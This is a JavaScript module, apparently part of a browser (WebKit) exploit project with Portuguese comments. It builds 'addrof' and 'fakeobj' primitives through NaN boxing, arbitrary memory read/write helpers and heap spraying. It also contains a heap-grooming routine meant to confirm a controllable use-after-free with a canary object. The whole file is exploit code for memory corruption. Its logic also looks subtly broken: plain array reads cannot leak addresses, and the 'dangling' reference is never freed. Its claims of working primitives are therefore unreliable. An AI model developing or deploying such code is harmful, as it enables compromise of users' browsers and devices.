// js/script3/testArrayBufferVictimCrash.mjs (v108-DEBUG_CANARY)
// =======================================================================================
// ESTRATÉGIA DE DEPURAÇÃO: UAF CONTROLADO COM "OBJETO CANÁRIO"
// O código original que causa o crash na Fase 5 (Heap Grooming) foi substituído
// por uma função de depuração. Esta função replica o mesmo heap grooming, mas em vez
// de executar a operação que causa o crash, ela tenta ler um valor conhecido ("canário")
// a partir da referência "use-after-free" para diagnosticar o controle sobre a memória.
// TODAS as outras partes do exploit (primitivas, verificações) permanecem 100% originais.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_Debug_v108_UAFCanary";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// NOVA FUNÇÃO DE DEPURAÇÃO: TENTATIVA DE UAF CONTROLADO COM CANÁRIO
// =======================================================================================
async function runUAFDebugAttempt() {
    const FNAME_DEBUG = "UAF_Canary_Debug";
    logS3(`--- Iniciando Depuração de UAF com "Objeto Canário" ---`, "subtest", FNAME_DEBUG);

    try {
        // Parâmetros do heap grooming, replicando o cenário do crash original
        const SPRAY_COUNT = 75000;
        const CANARY_VALUE_A = 0x41414141; // 'AAAA'
        const CANARY_VALUE_B = 0x42424242; // 'BBBB'

        // Nosso objeto canário. Será plantado na memória liberada.
        const debug_canary = { canary_prop_a: CANARY_VALUE_A, canary_prop_b: CANARY_VALUE_B };

        logS3(`[Grooming] Iniciando spray inicial de ${SPRAY_COUNT} objetos...`, "info", FNAME_DEBUG);
        let initial_spray = [];
        for (let i = 0; i < SPRAY_COUNT; i++) {
            initial_spray.push({ a: i });
        }
        logS3(`[Grooming] Spray inicial concluído.`, "info", FNAME_DEBUG);
        
        // Esta será a nossa referência "dangling" (pendurada). O objeto que ela referencia será liberado pelo GC.
        let dangling_ref = initial_spray[SPRAY_COUNT - 1]; 

        logS3(`[Grooming] Criando 'buracos' no heap liberando metade dos objetos...`, "info", FNAME_DEBUG);
        for (let i = 0; i < SPRAY_COUNT; i += 2) {
            initial_spray[i] = null;
        }
        logS3(`[Grooming] 'Buracos' criados.`, "info", FNAME_DEBUG);

        logS3(`[Grooming] Plantando o objeto canário e fillers nos 'buracos'...`, "info", FNAME_DEBUG);
        let fillers = [];
        for (let i = 0; i < SPRAY_COUNT; i++) {
            // Plantamos nosso canário em uma posição estratégica
            if (i === SPRAY_COUNT / 2) {
                fillers.push(debug_canary);
            } else {
                fillers.push({ filler: i });
            }
        }
        logS3(`[Grooming] Canário plantado. O heap está preparado.`, "info", FNAME_DEBUG);

        logS3(`[TRIGGER] Pausando por 100ms para tentar acionar o Garbage Collector...`, "warn", FNAME_DEBUG);
        await PAUSE_S3(100);
        logS3(`[TRIGGER] Pausa concluída. O GC provavelmente já executou.`, "warn", FNAME_DEBUG);
        
        // Agora, o momento da verdade.
        // Se o UAF funcionou, 'dangling_ref' agora aponta para a memória que foi
        // re-alocada por um dos nossos 'fillers', idealmente o 'debug_canary'.
        logS3(`[VERIFICAÇÃO] Tentando acessar a propriedade do canário através da referência 'dangling'...`, "leak", FNAME_DEBUG);
        logS3(`   -> Acessando 'dangling_ref.canary_prop_a'`, "leak", FNAME_DEBUG);

        try {
            const value_read = dangling_ref.canary_prop_a;
            
            logS3(`[VERIFICAÇÃO] Valor lido da referência 'dangling': ${toHex(value_read)}`, "leak", FNAME_DEBUG);

            if (value_read === CANARY_VALUE_A) {
                logS3(`++++++++++++ SUCESSO DE DEPURAÇÃO! UAF CONTROLADO! ++++++++++++`, "vuln", FNAME_DEBUG);
                logS3(`A referência 'dangling' agora aponta para o nosso objeto canário. A vulnerabilidade é controlável.`, "good", FNAME_DEBUG);
                return { success: true, message: "UAF controlado com sucesso." };
            } else {
                logS3(`!!!!!!!!!!!! FALHA NA DEPURAÇÃO: UAF NÃO CONTROLADO !!!!!!!!!!!!`, "error", FNAME_DEBUG);
                logS3(`Lemos um valor inesperado. O canário não foi plantado no local esperado, ou a referência aponta para outro objeto.`, "error", FNAME_DEBUG);
                return { success: false, message: `UAF não controlado. Lido: ${toHex(value_read)}` };
            }
        } catch (e) {
            logS3(`!!!!!!!!!!!! EXCEÇÃO DURANTE A VERIFICAÇÃO !!!!!!!!!!!!`, "critical", FNAME_DEBUG);
            logS3(`O acesso à propriedade 'dangling_ref.canary_prop_a' causou uma exceção: ${e.message}`, "critical", FNAME_DEBUG);
            logS3(`Isso pode significar que a referência aponta para memória completamente inválida, ou o tipo de objeto não tem a propriedade.`, "error", FNAME_DEBUG);
            return { success: false, message: `Exceção ao acessar a referência dangling: ${e.message}` };
        }

    } catch(e) {
        logS3(`Falha crítica no teste de depuração do UAF: ${e.message}`, "critical", FNAME_DEBUG);
        return { success: false, message: `Erro catastrófico no groom: ${e.message}` };
    }
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (MODIFICADA PARA CHAMAR O TESTE DE DEPURAÇÃO)
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Primitivas Unificadas e Depuração de UAF ---`, "test");

    let final_result = { success: false, message: "A verificação funcional de L/E falhou.", webkit_base: null };

    try {
        logS3("--- FASE 1/2: Configurando primitivas 'addrof' e 'fakeobj' com NaN Boxing... ---", "subtest");
        const vulnerable_slot = [13.37]; 
        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001);
        const addrof = (obj) => {
            vulnerable_slot[0] = obj;
            let value_as_double = vulnerable_slot[0];
            let value_as_int64 = doubleToInt64(value_as_double);
            return value_as_int64.sub(NAN_BOXING_OFFSET);
        };
        const fakeobj = (addr) => {
            const boxed_addr = new AdvancedInt64(addr).add(NAN_BOXING_OFFSET);
            const value_as_double = int64ToDouble(boxed_addr);
            vulnerable_slot[0] = value_as_double;
            return vulnerable_slot[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' robustas estão operacionais.", "good");
       
        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        const arb_read_final = (addr) => {
            leaker.obj_prop = fakeobj(addr);
            return doubleToInt64(leaker.val_prop);
        };
        const arb_write_final = (addr, value) => {
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
        };
        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");

        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
        const spray = [];
        for (let i = 0; i < 1000; i++) { spray.push({ a: 1.1, b: 2.2 }); }
        const test_obj = spray[500];
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        const test_obj_addr = addrof(test_obj);
        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
        const prop_a_addr = new AdvancedInt64(test_obj_addr.low() + 0x10, test_obj_addr.high());
        
        arb_write_final(prop_a_addr, value_to_write);
        const value_read = arb_read_final(prop_a_addr);

        if (!value_read.equals(value_to_write)) {
            throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
        }
        
        logS3("++++++++++++ SUCESSO! Primitivas L/E 100% funcionais. Partindo para depuração do UAF. ++++++++++++", "vuln");

        // --- ETAPA DE DEPURAÇÃO: CHAMADA PARA O TESTE DE UAF COM CANÁRIO ---
        const debug_result = await runUAFDebugAttempt();
        
        final_result = {
            success: debug_result.success,
            message: "Cadeia de exploração concluída. L/E funcional. Resultado da depuração do UAF: " + debug_result.message,
            webkit_base: null // O vazamento da base não é o objetivo deste script de depuração
        };

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
